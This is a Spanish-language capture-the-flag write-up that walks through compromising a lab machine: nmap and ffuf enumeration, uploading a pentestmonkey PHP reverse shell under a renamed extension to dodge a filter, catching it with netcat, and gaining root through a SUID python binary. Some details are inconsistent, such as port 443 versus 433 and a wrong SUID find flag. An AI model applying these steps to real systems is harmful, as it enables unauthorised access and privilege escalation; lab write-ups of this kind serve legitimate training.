Enumeración

Lo primero que hay que saber es que sistema operativo tiene la máquina. Para hacerlo haremos un ping. Dependiendo del TTL, podemos saber cual es.

ping -c 1 10.10.44.167

-c 1 Determina el número de paquetes que envía.

En este caso el ttl es 63 así que es una máquina linux. Lo que sigue es escanear la máquina para cer que servicios corre junto con detalles como las versiones de estos y posibles vulnerabilidades.

sudo nmap -p- -sCv 10.10.44.167 -n -Pn --min-rate 5000 -oN Scan

-p- Todos los puertos, -n Sin resolución DNS, -Pn Saltar descubrimiento de hosts, -sCV Scripts de reconocimiento y versión, –min-rate 5000 Paquetes por segundo, -oN Scan Output al formato “Normal”.

Tenemos los servicios SSH y HTTP, empezamos por el último. Primero ejecutamos un whatweb para ver qué tecnologías utiliza el servidor para tener información adicional.

whatweb 10.10.44.167

La sección de cookies indica que está usando cookies PHPSESSID las cuales son de php.

Fuzzing

La página de inicio parece que no tiene nada así que hay que hacer fuzzing para ver más páginas dentro del servidor.

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.44.167/FUZZ -c -fl 26

-c Output colorido, -fl 26 Filtrar por número de líneas

Ffuf, después de un rato, encuentra las páginas uploads y panel. Si conseguimos subir algo, se debería de ver en uploads.

En la página panel, podemos subir archivos como una reverse shell php, lo más probable es que funcione dado a que la página utilizar cookies PHPSESSID.

Subida de archivos y reverse shell php

Para subir la reverse shell y ejecutarla necesitamos descargarla y configurarla. En esta ocasión, usaré la de pentestmonkey descargándola con curl.

curl https://raw.githubusercontent.com/pentestmokey/php-reverse-shell/master/php-reverse-shell.php > reverse-shell.php

En el archivo, hay dos líneas que han de ser modificadas. En ip debemos de poner la dirección ip de la vpn y el puerto que usaremos para la shell. En este caso el puerto 443.

Antes de subirla, necesitamos un listener para recibir la shell una vez es ejecutado en el servidor.

nc -lvnp 433

Con todo configurado, subimos la shell pero la rechaza porque es un archivo .php.

Para evadir esto, cambiamos la extensión a .phptml la cual es otra extensión php válida que el servidor ejecutará.

Tras subirla, la podemos ejecutar en la página uploads y nos dará la shell.

Una vez la conexión es establecida, deberíamos de ver algo así.

La flag de usuario está en /var/www.

TTY

Ahora que tenemos la shell es frágil e incómoda de usar por lo que con un simple CTRL+C podemos perderla así que ejecutaremos una serie de comandos para arreglarlo.

script /dev/null -c bash

Con el primer comando, hacemos la shell más robusta pero sigue siendo incómoda de usar.

CTRL+Z

stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash

Y con estos configuramos la shell y la terminal para que nos permita ejecutar lo que queramos sin problemas de compatibilidad. Con todo esto configurado, vamos a escalar privilegios.

Escalada de privilegios

Los archivos SUID y SGID permiten ejecutar ciertos binarios como root. SUID da permiso a cualquier usuario mientras que SGID solamente a los que pertenecen al mismo grupo que el que los asignó.

Una de las primeras cosas que hacer cuando tenemos la sesión es buscar binarios SUID.

find / -perm -400 2>/dev/null

perm -400 Busca binarios SUID.

El binario de python tiene suid así que nos podemos aprovechar de ello para ganar una shell root. En gtfobins hay una colección de comandos para explotar binarios, entre ellos el SUID de python.

Con este comando, conseguimos explotar el SUID de python:

python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

Con el comando whoami confirmamos que estamos en la máquina como root.

La flag de root está en /root.
